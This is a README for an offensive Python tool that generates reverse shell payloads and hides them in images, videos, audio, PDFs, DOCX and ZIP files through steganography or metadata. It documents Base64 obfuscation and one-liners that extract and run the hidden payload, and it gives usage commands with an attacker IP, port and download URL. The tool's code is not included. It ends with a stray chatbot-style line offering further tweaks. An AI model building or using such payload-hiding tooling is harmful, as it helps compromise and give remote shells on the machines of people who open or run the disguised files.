# Steganography Hidden Payload Injector By: Dogematti

This project allows you to dynamically inject payloads, such as reverse shells, into various media files using steganography techniques or metadata manipulation. It supports multiple media formats and provides an easy-to-use command-line interface for injecting and extracting payloads from files.

## Features
- **Dynamic Compatibility Check**: Ensures the media file is supported for payload injection.
- **Reverse Shell Payload Generation**: Dynamically generate reverse shell payloads by specifying an IP and port.
- **Steganography Injection**: Hide payloads within image files using steganography.
- **Metadata Injection**: Inject payloads into media files (e.g., images, videos, PDFs, DOCX, ZIP) using metadata fields.
- **Payload Extraction**: Extract payloads from supported media types.
- **Base64 Encoding**: Optionally encode payloads in Base64 for transport or obfuscation.
- **One-Liner Command Generation**: Create ready-to-use one-liners to extract and execute the hidden payload from a media file.

## Inspiration

This project is inspired by the ideas found in **rMETASHELL**, which provided the foundation and concept for dynamic payload injection and extraction using steganography and metadata manipulation. Thanks to **rMETASHELL** for the inspiration!

## Requirements

The following dependencies are required to run this project:

- **Python 3.x**
- **steghide** (for steganography-based injection)
- **exiftool** (for manipulating metadata in image files)
- **ffmpeg** and **ffprobe** (for handling media files such as mp4 and mp3)
- **unzip** (for extracting payloads from DOCX and ZIP files)

### Install external dependencies:

```bash
sudo apt-get install steghide exiftool ffmpeg unzip# Steganography-hidden-payload


Usage

Inject a Reverse Shell Payload into a PNG Image using Steganography:

python hide-a-payload.py -p reverse_shell -i 192.168.1.100 -r 4444 -f image.png -s

This command generates a reverse shell payload and hides it inside the image.png file using steganography.

Inject a Payload into Media File Metadata:

python hide-a-payload.py -p "Your custom payload here" -f video.mp4

This command injects a custom payload into the metadata of video.mp4.

Extract a Payload from a Media File:

python hide-a-payload.py -x -f image.png

This command extracts the payload hidden in the image.png file.
Generate a One-Liner for Payload Extraction:

python hide-a-payload.py -p reverse_shell -i 192.168.1.100 -r 4444 -f image.png -u http://example.com

You will be prompted to select the type of one-liner to generate for extracting and executing the payload.

Supported Media Types

The tool currently supports the following media formats for payload injection and extraction:

Images: PNG, JPG, JPEG

Videos: MP4

Audio: MP3

Documents: PDF, DOCX

Archives: ZIP


Command-Line Options

-p or --payload: Specify the payload type (e.g., reverse_shell or custom payload).

-i or --ip: IP address for reverse shell payload.

-r or --port: Port for reverse shell payload.

-f or --file: Specify the media file for payload injection or extraction.

-s or --steganography: Use steganography for payload injection.

-x or --extract: Extract payload from a media file.

-b or --base64: Base64 encode the generated payload.

-c or --check: Check if a media file is compatible for payload injection.


Example Usage:

Inject a Reverse Shell Payload into a PNG Image using Steganography

python hide-a-payload.py -p reverse_shell -i 192.168.1.100 -r 4444 -f image.png -s

Extract a Payload from a PNG Image

python hide-a-payload.py -x -f image.png

Generate a One-Liner for Reverse Shell Payload Extraction

python hide-a-payload.py -p reverse_shell -i 192.168.1.100 -r 4444 -f video.mp4 -u http://example.com

License

This project is licensed under the GNU GPlv3.

Acknowledgements

Special thanks to rMETASHELL for the idea and inspiration behind this project. Their work laid the foundation for this dynamic media-based payload injection and extraction tool.

This `README.md` should cover all aspects of your project, including installation, usage, and a special acknowledgment to **rMETASHELL** for the idea. Let me know if you need further tweaks!